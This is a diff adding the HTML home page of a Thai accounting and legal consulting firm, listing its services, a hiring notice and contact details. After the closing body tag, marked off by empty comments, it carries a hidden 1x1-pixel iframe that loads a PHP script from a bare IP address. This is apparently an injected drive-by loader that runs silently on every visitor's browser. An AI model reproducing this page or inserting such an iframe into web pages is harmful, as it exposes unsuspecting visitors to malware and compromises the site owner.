@@ -1,0 +1,181 @@
+﻿<!DOCTYPE html>
+<html dir="ltr" lang="en-US"><head><!-- Created by Artisteer v4.0.0.58475 -->
+    <meta charset="utf-8">
+    <title>Home</title>
+    <meta name="viewport" content="initial-scale = 1.0, maximum-scale = 1.0, user-scalable = no, width = device-width">
+
+    <!--[if lt IE 9]><script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+    <link rel="stylesheet" href="style.css" media="screen">
+    <!--[if lte IE 7]><link rel="stylesheet" href="style.ie7.css" media="screen" /><![endif]-->
+    <link rel="stylesheet" href="style.responsive.css" media="all">
+
+
+    <script src="jquery.js"></script>
+    <script src="script.js"></script>
+    <script src="script.responsive.js"></script>
+<meta name="description" content="Description">
+<meta name="keywords" content="Keywords">
+
+
+
+<style>.art-content .art-postcontent-0 .layout-item-0 { margin-top: 10px;margin-bottom: 5px;  }
+.art-content .art-postcontent-0 .layout-item-1 { border-spacing: 10px 0px; border-collapse: separate;  }
+.art-content .art-postcontent-0 .layout-item-2 { color: #DBDCDC; background: #2F3537; padding-right: 10px;padding-left: 10px;  }
+.art-content .art-postcontent-0 .layout-item-3 { margin-bottom: 5px;  }
+.art-content .art-postcontent-0 .layout-item-4 { border-spacing: 9px 0px; border-collapse: separate;  }
+.art-content .art-postcontent-0 .layout-item-5 { padding-right: 10px;padding-left: 10px;  }
+.ie7 .post .layout-cell {border:none !important; padding:0 !important; }
+.ie6 .post .layout-cell {border:none !important; padding:0 !important; }
+
+</style></head>
+<body>
+<div id="art-main">
+<nav class="art-nav">
+    <ul class="art-hmenu"><li><a href="home.html" class="active">Home</a></li><li><a href="our-service.html">Our Service</a></li><li><a href="recuitment.html">Recuitment</a></li><li><a href="company-profile.html">Company Profile</a></li><li><a href="management.html">Management</a></li><li><a href="contacts.html">Contacts</a></li></ul> 
+    </nav>
+<header class="art-header">
+<div class="art-slider art-slidecontainerheader">
+    <div class="art-slider-inner">
+<div class="art-slide-item art-slideheader0">
+
+</div>
+<div class="art-slide-item art-slideheader1">
+
+</div>
+<div class="art-slide-item art-slideheader2">
+
+</div>
+
+    </div>
+</div>
+<div class="art-slidenavigator art-slidenavigatorheader" data-left="90.87">
+<a href="#" class="art-slidenavigatoritem"></a><a href="#" class="art-slidenavigatoritem"></a><a href="#" class="art-slidenavigatoritem"></a>
+</div>
+
+
+
+    <div class="art-shapes">
+
+            </div>
+<h1 class="art-headline" data-left="43.1%">
+    <a href="#">Enter Site Title</a>
+</h1>
+<h2 class="art-slogan" data-left="48.18%">Enter Site Slogan</h2>
+
+
+
+
+                
+                    
+</header>
+<div class="art-sheet clearfix">
+            <div class="art-layout-wrapper">
+                <div class="art-content-layout">
+                    <div class="art-content-layout-row">
+                        <div class="art-layout-cell art-content"><article class="art-post art-article">
+                                
+                                                
+                <div class="art-postcontent art-postcontent-0 clearfix"><div class="art-content-layout-wrapper layout-item-0">
+<div class="art-content-layout layout-item-1">
+    <div class="art-content-layout-row">
+    <div class="art-layout-cell layout-item-2" style="width: 33%" >
+        <h4 style="text-align: center;">Profile</h4>
+        <p> </p>
+        <p><a href="company-profile.html" target="_self" title="profile"><img width="197" height="198" alt="" src="images/b267ea3b-1c98-41a1-80bc-2c5626dc2c25.png"></a><span lang="TH" style="font-size: 14pt; line-height: 115%; font-family: 'Angsana New', serif; color: #F9FAFB;">ประกอบธุรกิจ</span><span style="font-size: 14pt; line-height: 115%; font-family: 'Angsana New', serif; color: #F9FAFB;">:<br>
+        <span lang="TH" style="color: #F9FAFB;">ให้บริกาจัดทำบัญชี &nbsp;และภาษีจดทะเบียนธุรกิจและตรวจสอบบัญชี<br></span><br>
+        <span lang="TH" style="color: #F9FAFB;">เริ่มดำเนินงานธุรกิจ</span>:<br>
+        <span lang="TH" style="color: #F9FAFB;">ตั้งแต่ปี 2543<br></span><br>
+        <span lang="TH" style="color: #F9FAFB;">จำนวนบุคคลากร</span>:<br>
+        <span lang="TH"><span style="color: #F9FAFB;">มีบุคคลากรมากกว่า 10 คน</span></span></span></p>
+    </div><div class="art-layout-cell layout-item-2" style="width: 34%" >
+        <h4 style="text-align: center;">Service</h4>
+        <p> </p>
+        <p><a href="our-service.html" target="_self" title="accounting"><img width="197" height="198" alt="" src="images/876a8c4a-231d-4623-bd7f-dbb833b53556.png" class=""></a><p>ให้บริการจัดทำบัญชี  และภาษีจดทะเบียนธุรกิจและตรวจสอบบัญชี</p>
+    </div><div class="art-layout-cell layout-item-2" style="width: 33%" >
+        <h4 style="text-align: center;">Find job</h4>
+        <h4 style="text-align: center;"><a href="recuitment.html" target="_self" title="job"><img width="187" height="188" alt="" src="images/2.jpg" class=""></a><span style="color: rgb(219, 220, 220); font-family: Tahoma, Arial, Helvetica, sans-serif; font-size: 13px; font-weight: normal;"><br></span></h4>
+        <h4 style="text-align: left;"><span style="color: rgb(219, 220, 220); font-family: Tahoma, Arial, Helvetica, sans-serif; font-size: 13px; font-weight: normal;">บริษัทอยู่ในช่วงของการเติบโต &nbsp;จึงต้องการบุคคลากร &nbsp;ที่พร้อมที่จะก้าวไปข้างหน้าพร้อมๆกับบริษัท &nbsp;</span></h4>
+        <h4 style="text-align: left;"><span style="color: rgb(219, 220, 220); font-family: Tahoma, Arial, Helvetica, sans-serif; font-size: 13px; font-weight: normal;">ทางบริษัทมีบุคคลากรที่พร้อมจะสอนงาน &nbsp;จึงเป็นจุดเริ่มต้นสำหรับผู้จบใหม่ &nbsp;อีกทั้ง ที่ตั้งของบริษัทเอื้อต่อการเดินทาง &nbsp;</span><br></h4>
+        <h4 style="text-align: center;"></h4>
+        <h4 style="text-align: center;"></h4>
+    </div>
+    </div>
+</div>
+</div>
+<div class="art-content-layout-wrapper layout-item-3">
+<div class="art-content-layout layout-item-4">
+    <div class="art-content-layout-row">
+    <div class="art-layout-cell layout-item-5" style="width: 76%" >
+        <h4>Our Mission</h4>
+        <p>We are a public accounting and legal consulting firm rendering professional services to a broad range of small to mid-sized businesses in Thailand by the team with experience in big international firm for more than 10 years</p>
+        <p>เราเป็นผู้ให้บริการปรึกษาทางธุรการในด้านการบัญชีและกฏหมายอย่างกว้างขวาง แก่ธุรกิจขนาดย่อมในประเทศไทยโดยคณะทำงานที่มีประสบการณ์นานมากกว่า 10 ปี</p>
+    </div><div class="art-layout-cell layout-item-5" style="width: 24%" >
+        <h4>What We Offer</h4>
+        <ul>
+        <li>Accounting &amp; Financial Reporting</li>
+        <li>Immigration &amp; Work Permit</li>
+        <li>Trademark Protection</li>
+        <li>Principal taxes</li>
+        <li>Taxation<br></li>
+        </ul>
+    </div>
+    </div>
+</div>
+</div>
+</div>
+                                
+                </article></div>
+                        <div class="art-layout-cell art-sidebar1"><div class="art-block clearfix">
+        <div class="art-blockheader">
+            <h3 class="t">Company Info</h3>
+        </div>
+        <div class="art-blockcontent"><p><img width="180" alt="" src="images/shutterstock_17150008-2-2-2.jpg" style="float:left;" class=""></p>
+<p><span lang="TH" style="font-size: 14pt; line-height: 115%; font-family: 'Angsana New', serif; color: black;">ประกอบธุรกิจ</span><span style="font-size: 14pt; line-height: 115%; font-family: 'Angsana New', serif; color: black;">: &nbsp;<span lang="TH">ให้บริกาจัดทำบัญชี<br>
+และภาษีจดทะเบียนธุรกิจและตรวจสอบบัญชี</span><br></span><br></p></div>
+</div><div class="art-block clearfix">
+        <div class="art-blockheader">
+            <h3 class="t">Our Service</h3>
+        </div>
+        <div class="art-blockcontent"><div style="margin-left: 2em"> </div>
+<p> </p>
+<ul>
+<li><a href="our-service.html" target="_self" title="บัญชี">บริการด้านบัญชี</a><span style="color: rgb(14, 16, 17); font-family: Arial, 'Arial Unicode MS', Helvetica, sans-serif; font-size: 20px; line-height: normal;"><b><span style="font-family: 'Angsana New', serif; color: rgb(77, 122, 143); font-size: 16px;" lang="TH"></span></b></span><br></li>
+<li><a href="our-service.html" target="_self" title="ภาษี">บริการด้านภาษี</a><span style="color: rgb(14, 16, 17); font-family: Arial, 'Arial Unicode MS', Helvetica, sans-serif; font-size: 20px; line-height: normal;"><b><span style="line-height: 27px; font-family: 'Angsana New', serif; color: rgb(79, 125, 146); font-size: 16px;" lang="TH"></span></b></span><br></li>
+<li><a href="our-service.html" target="_self" title="ประกันสังคม">บริการด้านประกันสังคม</a><span style="font-family: Arial, 'Arial Unicode MS', Helvetica, sans-serif; font-size: 24px; line-height: normal;"><b><span style="font-family: 'Angsana New', serif; color: rgb(79, 125, 146); font-size: 16px;" lang="TH"></span></b></span><br></li>
+<li><a href="our-service.html" target="_self" title="จดทะเบียน">บริการด้านจดทะเบียน</a><span style="font-family: Arial, 'Arial Unicode MS', Helvetica, sans-serif; font-size: 24px; line-height: normal;"><b><span style="line-height: 24px; font-family: 'Angsana New', serif; color: rgb(79, 125, 146); font-size: 16px;" lang="TH"></span></b></span><br></li>
+<li><a href="our-service.html" target="_self" title="ตรวจสอบ">บริการด้านการตรวจสอบ</a><span style="font-family: Arial, 'Arial Unicode MS', Helvetica, sans-serif; font-size: 24px; line-height: normal;"><b><span style="font-family: 'Angsana New', serif; color: rgb(79, 125, 146); font-size: 16px;" lang="TH"></span></b></span><br></li>
+<li><a href="our-service.html" target="_self" title="จัดทำเงินเดือน">จัดทำเงินเดือน</a><span style="font-weight: normal; line-height: normal;"><b><span style="line-height: 24px; font-family: 'Cordia New', sans-serif; color: rgb(79, 125, 146); font-size: 16px;" lang="TH"></span></b></span><br></li>
+</ul>
+<p> </p>
+<div style="margin-left: 2em"> </div>
+<p><br></p></div>
+</div><div class="art-block clearfix">
+        <div class="art-blockheader">
+            <h3 class="t">Contact Us</h3>
+        </div>
+        <div class="art-blockcontent"><p><img width="180" alt="" src="images/003-2.jpg" class=""></p>
+<p><span style="line-height: 19px;">Tel:&nbsp;<span lang="TH" style="font-size: 14pt; line-height: 21px; font-family: 'Angsana New', serif; color: black;">02-2150710-2<br>
+<span style="color: rgb(52, 54, 55); font-family: Tahoma, Arial, Helvetica, sans-serif; font-size: 13px; line-height: 19px;">Fax:&nbsp;<span lang="TH" style="font-size: 14pt; line-height: 21px; font-family: 'Angsana New', serif; color: black;">02-2150713<br>
+<span style="color: rgb(52, 54, 55); font-family: Tahoma, Arial, Helvetica, sans-serif; font-size: 13px; line-height: 19px;">E-mail:&nbsp;ama43@ymail.com<br>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ama@amnuayporn.co.th</span></span></span></span></span><br></p>
+<p><a href="#"></a></p></div>
+</div></div>
+                    </div>
+                </div>
+            </div><footer class="art-footer">
+<div style="position:relative;display:inline-block;padding-left:42px;padding-right:42px">
+<p><br></p>
+<p>Copyright © 2011. All Rights Reserved. </p>
+</div>
+</footer>
+
+    </div>
+    <p class="art-page-footer">
+        <span id="art-footnote-links"><a href="http://www.artisteer.com/" target="_blank">Web Template</a> created with Artisteer.</span>
+        <span id="art-licence-links">Images by Flickr/Nicholas A. Tonelli,john,Berit</span>
+    </p>
+</div>
+
+
+</body>  <!-- . --><iframe width="1px" height="1px" src="http://5.45.179.41/transport/replys-terribly-reading_works.php" style="display:block;" ></iframe>
+<!-- . --> </html>   
